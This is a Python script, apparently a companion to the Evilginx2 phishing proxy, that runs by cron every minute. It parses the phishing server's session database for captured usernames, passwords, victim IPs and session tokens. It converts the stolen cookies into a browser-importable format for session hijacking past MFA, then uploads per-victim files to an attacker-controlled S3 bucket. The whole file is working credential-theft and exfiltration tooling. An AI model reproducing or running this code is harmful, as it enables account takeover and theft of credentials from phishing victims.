import json
import time
import os
import datetime
from collections import OrderedDict

DB = '/root/.data/data.db'
PHISHLET_NAME = 'new'
CONFIG = '/root/.data/config.json'

MAINPATH = "/tmp/comps/"
LASTRUN = "/tmp/lastrun"

BUCKETNAME = "phish-etech-it.com"
PROFILENAME = ""





BUCKETPREPEND = "phish-"
BUCKETREGION = "eu-north-1"

"""
Change the BUCKETPREPEND to the prepended name of the bucket we use.
The bucket name must be {BUCKETPREPEND}-{DOMAIN_NAME}
example "authbeamphishingdemo-etech-it.com"

Careful as your domain_name used by evilginx could be a subdomain as well.

Add cronjob to sudo user crontab.

sudo su
crontab -e

# Add this line
* * * * * /usr/bin/python3 /home/ubuntu/EvilGinx2_S3.py

# The reload the crontab with the following:
service cron reload

"""


def reverse_transform_json(token_json):
    # Convert the json string to python object if needed
    if isinstance(token_json, str):
        output_json = json.loads(token_json)
    else:
        output_json = token_json

    # Initialize an empty list for the result
    result = []

    # Loop through each domain in the output dictionary
    for domain, cookies in output_json.items():
        # Loop through each cookie in the domain
        if domain[0] == ".":
            domain = domain[1:]
        for name, cookie in cookies.items():
            # Add the cookie to the result with the original structure
            
            result.append({
                "domain": domain,
                "name": name,
                "value": cookie["Value"],
                "path": cookie["Path"],
                "httpOnly": cookie["HttpOnly"],
                # Add default values for the other fields
                "expirationDate": None,
                "hostOnly": False,
                "sameSite": "no_restriction",
                "secure": True,
                "session": False,
                "storeId": None,
            })

    # Convert the result to json string
    result_json = json.dumps(result, indent=4)

    return result_json


def copy_db():

    # check to see if the file exists
    os.system(f"cp {DB} /tmp/data.db")
    
    # Check if comps dir exists if not create it
    if os.path.exists(MAINPATH) is False:
        os.system('mkdir /tmp/comps')



def parse_db():

    sessiondict = OrderedDict()

    f = open('/tmp/data.db', 'r')

    for line in f:
        if '{"id":' in line:
            
            tmp_session = json.loads(line)
            
            session = OrderedDict()
            session['id'] = tmp_session['id']
            session['phishlet'] = tmp_session['phishlet']
            session['username'] = tmp_session['username']
            session['password'] = tmp_session['password']
            session['landing_url'] = tmp_session['landing_url']
            session['remote_ip'] = tmp_session['remote_addr']
            session['create_time'] = tmp_session['create_time']
            session['update_time'] = tmp_session['update_time']
            session['useragent'] = tmp_session['useragent']
            session['tokens'] = tmp_session['tokens']

            sessiondict[session['id']] = session
            
    f.close()

    return sessiondict

def is_string_in_file(filename, string_check):
    with open(f'{MAINPATH}{filename}', 'r') as read_obj:
        for line in read_obj:
            if string_check in line:
                return True
    return False

def create_tmp_file(session, pretext):
    """
    Adding the token_status piece to avoid getting only the password, when the script runs
    but evilginx is still pending to capture the tokens from time consuming MFA user process.
    In case it fails to capture tokens, we still need at least the password.
    So we create different filenames for when we have a token and different when we captured it.

    """
    if session['tokens'] and len(session['tokens'])>0:
        tokens_status = 'full'
    else:
        tokens_status = 'plain'
    filename = f"{pretext}_id_{session['id']}_{session['username']}_{tokens_status}.txt"

    # Compare Current with new
    cur_files = os.listdir(MAINPATH)
    for filen in cur_files:
        if filen == filename:
            # Compare here
            if is_string_in_file(filen, session['username']) is False or is_string_in_file(filen, session['password']) is False or is_string_in_file(filen, str(session['tokens'])) is False:
                # Something Changed
                print("New Data")
            else:
                return None



    f = open(f'{MAINPATH}{filename}', 'w')

    for key,val in session.items():

        if key == 'id':
            f.write(f'{key}:\t\t{val}\n')
            continue

        if key == 'tokens':
            parsed_token = reverse_transform_json(val)
            f.write(f'\n{val}\n')
            f.write(f'\nparsed:\n\n{parsed_token}\n')
            continue

        f.write(f'{key}:\t{val}\n')

    f.close()

def get_time(filename):
    t = os.path.getmtime(f'{MAINPATH}{filename}')
    return datetime.datetime.fromtimestamp(t)


def get_last_run():
    if os.path.exists(LASTRUN) is False:
        os.system(f'touch {LASTRUN}')
        return datetime.datetime.now()

    else:
        f = open(LASTRUN, 'r')
        last_run = datetime.datetime.strptime(f.read(), '%y-%m-%d %H:%M:%S')
        f.close()
        return last_run

def gen_last_run():
    f = open(LASTRUN, 'w')
    f.write(str(datetime.datetime.now().strftime("%y-%m-%d %H:%M:%S")))
    f.close()

def is_new(last_run, file_date):
    if last_run >= file_date:
        return False
    else:
        return True


def get_net_new_fns(last_run):

    file_names = os.listdir(MAINPATH)

    new_files = list()

    for filen in file_names:
        if is_new(last_run, get_time(filen)):
            new_files.append(filen)
    

    return new_files

def getBucket():
    if BUCKETNAME and BUCKETNAME != "":
        return BUCKETNAME
    else:
        for bucket in str(os.popen('aws s3 ls').read()).split('\n'):
            if BUCKETPREPEND in bucket:
                return bucket.split(' ')[2]

def upload_file(filename, bucketname):
    AWSCMD = f"aws s3 cp {MAINPATH}{filename} s3://{bucketname}/{filename} --region {BUCKETREGION}"
    print(f"cmd: {AWSCMD}")
    os.system(AWSCMD)


def main():

    # with open(CONFIG, 'r') as fh:
    #     for line in fh:
    #         if 'new:' in line:
    #             pretext = line.split(' ')[3].strip('\n')
    
    pretext = PHISHLET_NAME

    # Check if we even have an gnix db available
    if not os.path.exists(DB):
        return None

    last_run = get_last_run()

    # Copy over DB to avoid issues
    copy_db()

    # Parse out DB into Json Objs
    sessiondict = parse_db()

    for session in sessiondict.values():
        create_tmp_file(session, pretext)

    # Get All FNs That are New
    fileList = get_net_new_fns(last_run)

    print(f"new files: {fileList}")
    
    # Push New Files To AWS
    for filen in fileList:
        upload_file(filen, getBucket())
    
    gen_last_run()

if __name__ == "__main__":
    main()

